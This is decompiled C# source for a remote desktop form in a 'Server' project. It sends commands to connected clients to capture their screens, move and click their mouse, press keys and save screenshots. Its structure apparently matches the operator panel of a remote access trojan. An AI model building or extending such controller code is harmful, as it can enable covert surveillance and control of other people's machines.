using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using Siticone.Desktop.UI.WinForms;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;

namespace Server.Forms
{
	// Token: 0x020000A7 RID: 167
	public partial class FormRemoteDesktop : Form
	{
		// Token: 0x170000C4 RID: 196
		// (get) Token: 0x06000520 RID: 1312 RVA: 0x00004B25 File Offset: 0x00002D25
		// (set) Token: 0x06000521 RID: 1313 RVA: 0x00004B2D File Offset: 0x00002D2D
		public FormMain F { get; set; }

		// Token: 0x170000C5 RID: 197
		// (get) Token: 0x06000522 RID: 1314 RVA: 0x00004B36 File Offset: 0x00002D36
		// (set) Token: 0x06000523 RID: 1315 RVA: 0x00004B3E File Offset: 0x00002D3E
		internal Clients ParentClient { get; set; }

		// Token: 0x170000C6 RID: 198
		// (get) Token: 0x06000524 RID: 1316 RVA: 0x00004B47 File Offset: 0x00002D47
		// (set) Token: 0x06000525 RID: 1317 RVA: 0x00004B4F File Offset: 0x00002D4F
		internal Clients Client { get; set; }

		// Token: 0x170000C7 RID: 199
		// (get) Token: 0x06000526 RID: 1318 RVA: 0x00004B58 File Offset: 0x00002D58
		// (set) Token: 0x06000527 RID: 1319 RVA: 0x00004B60 File Offset: 0x00002D60
		public string FullPath { get; set; }

		// Token: 0x170000C8 RID: 200
		// (get) Token: 0x06000528 RID: 1320 RVA: 0x00004B69 File Offset: 0x00002D69
		// (set) Token: 0x06000529 RID: 1321 RVA: 0x00004B71 File Offset: 0x00002D71
		public Image GetImage { get; set; }

		// Token: 0x0600052A RID: 1322 RVA: 0x00004B7A File Offset: 0x00002D7A
		public FormRemoteDesktop()
		{
			this._keysPressed = new List<Keys>();
			this.InitializeComponent();
		}

		// Token: 0x0600052B RID: 1323 RVA: 0x00043DB8 File Offset: 0x00041FB8
		private void timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x0600052C RID: 1324 RVA: 0x00043E0C File Offset: 0x0004200C
		private void FormRemoteDesktop_Load(object sender, EventArgs e)
		{
			try
			{
				this.button1.Tag = "stop";
			}
			catch
			{
			}
		}

		// Token: 0x0600052D RID: 1325 RVA: 0x00043E40 File Offset: 0x00042040
		private void Button1_Click(object sender, EventArgs e)
		{
			if (this.button1.Tag == "play")
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "capture";
				msgPack.ForcePathObject("Quality").AsInteger = (long)Convert.ToInt32(this.numericUpDown1.Value.ToString());
				msgPack.ForcePathObject("Screen").AsInteger = (long)Convert.ToInt32(this.numericUpDown2.Value.ToString());
				this.decoder = new UnsafeStreamCodec(Convert.ToInt32(this.numericUpDown1.Value), true);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				this.numericUpDown1.Enabled = false;
				this.numericUpDown2.Enabled = false;
				this.label4.Enabled = true;
				this.btnMouse.Enabled = true;
				this.button1.Tag = "stop";
				return;
			}
			this.button1.Tag = "play";
			try
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack2.ForcePathObject("Option").AsString = "stop";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
			}
			catch
			{
			}
			this.numericUpDown1.Enabled = true;
			this.numericUpDown2.Enabled = true;
			this.label4.Enabled = false;
			this.btnMouse.Enabled = false;
		}

		// Token: 0x0600052E RID: 1326 RVA: 0x00044000 File Offset: 0x00042200
		private void BtnSave_Click(object sender, EventArgs e)
		{
			if (this.button1.Tag == "stop")
			{
				if (this.timerSave.Enabled)
				{
					this.timerSave.Stop();
					return;
				}
				this.timerSave.Start();
				try
				{
					if (!Directory.Exists(this.FullPath))
					{
						Directory.CreateDirectory(this.FullPath);
					}
					Process.Start(this.FullPath);
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600052F RID: 1327 RVA: 0x00044080 File Offset: 0x00042280
		private void TimerSave_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				Encoder quality = Encoder.Quality;
				EncoderParameters encoderParameters = new EncoderParameters(1);
				EncoderParameter encoderParameter = new EncoderParameter(quality, 50L);
				encoderParameters.Param[0] = encoderParameter;
				ImageCodecInfo encoder = this.GetEncoder(ImageFormat.Jpeg);
				this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", encoder, encoderParameters);
				if (encoderParameters != null)
				{
					encoderParameters.Dispose();
				}
				if (encoderParameter != null)
				{
					encoderParameter.Dispose();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000530 RID: 1328 RVA: 0x00044130 File Offset: 0x00042330
		private ImageCodecInfo GetEncoder(ImageFormat format)
		{
			foreach (ImageCodecInfo imageCodecInfo in ImageCodecInfo.GetImageDecoders())
			{
				if (imageCodecInfo.FormatID == format.Guid)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		// Token: 0x06000531 RID: 1329 RVA: 0x0004416C File Offset: 0x0004236C
		private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
				{
					Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
					int num = 0;
					if (e.Button == MouseButtons.Left)
					{
						num = 2;
					}
					if (e.Button == MouseButtons.Right)
					{
						num = 8;
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseClick";
					msgPack.ForcePathObject("X").AsInteger = (long)point.X;
					msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
					msgPack.ForcePathObject("Button").AsInteger = (long)num;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000532 RID: 1330 RVA: 0x000442CC File Offset: 0x000424CC
		private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
				{
					Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
					int num = 0;
					if (e.Button == MouseButtons.Left)
					{
						num = 4;
					}
					if (e.Button == MouseButtons.Right)
					{
						num = 16;
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseClick";
					msgPack.ForcePathObject("X").AsInteger = (long)point.X;
					msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
					msgPack.ForcePathObject("Button").AsInteger = (long)num;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000533 RID: 1331 RVA: 0x00044430 File Offset: 0x00042630
		private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
				{
					Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseMove";
					msgPack.ForcePathObject("X").AsInteger = (long)point.X;
					msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000534 RID: 1332 RVA: 0x00004BB7 File Offset: 0x00002DB7
		private void Button3_Click(object sender, EventArgs e)
		{
			if (this.isMouse)
			{
				this.isMouse = false;
			}
			else
			{
				this.isMouse = true;
			}
			this.pictureBox1.Focus();
		}

		// Token: 0x06000535 RID: 1333 RVA: 0x00044560 File Offset: 0x00042760
		private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				Image getImage = this.GetImage;
				if (getImage != null)
				{
					getImage.Dispose();
				}
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					Clients client = this.Client;
					if (client == null)
					{
						return;
					}
					client.Disconnected();
				});
			}
			catch
			{
			}
		}

		// Token: 0x06000536 RID: 1334 RVA: 0x00004BDD File Offset: 0x00002DDD
		private void btnKeyboard_Click(object sender, EventArgs e)
		{
			if (this.isKeyboard)
			{
				this.isKeyboard = false;
			}
			else
			{
				this.isKeyboard = true;
			}
			this.pictureBox1.Focus();
		}

		// Token: 0x06000537 RID: 1335 RVA: 0x000445A8 File Offset: 0x000427A8
		private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isKeyboard)
			{
				if (!this.IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				if (this._keysPressed.Contains(e.KeyCode))
				{
					return;
				}
				this._keysPressed.Add(e.KeyCode);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "keyboardClick";
				msgPack.ForcePathObject("key").AsInteger = (long)Convert.ToInt32(e.KeyCode);
				msgPack.ForcePathObject("keyIsDown").SetAsBoolean(true);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x06000538 RID: 1336 RVA: 0x000446B0 File Offset: 0x000428B0
		private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
		{
			if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && base.ContainsFocus && this.isKeyboard)
			{
				if (!this.IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				this._keysPressed.Remove(e.KeyCode);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "keyboardClick";
				msgPack.ForcePathObject("key").AsInteger = (long)Convert.ToInt32(e.KeyCode);
				msgPack.ForcePathObject("keyIsDown").SetAsBoolean(false);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x06000539 RID: 1337 RVA: 0x00004C03 File Offset: 0x00002E03
		private bool IsLockKey(Keys key)
		{
			return (key & Keys.Capital) == Keys.Capital || (key & Keys.NumLock) == Keys.NumLock || (key & Keys.Scroll) == Keys.Scroll;
		}

		// Token: 0x040004A3 RID: 1187
		public int FPS;

		// Token: 0x040004A4 RID: 1188
		public Stopwatch sw = Stopwatch.StartNew();

		// Token: 0x040004A5 RID: 1189
		public IUnsafeCodec decoder = new UnsafeStreamCodec(60, true);

		// Token: 0x040004A6 RID: 1190
		public Size rdSize;

		// Token: 0x040004A7 RID: 1191
		private bool isMouse;

		// Token: 0x040004A8 RID: 1192
		private bool isKeyboard;

		// Token: 0x040004A9 RID: 1193
		public object syncPicbox = new object();

		// Token: 0x040004AA RID: 1194
		private readonly List<Keys> _keysPressed;
	}
}
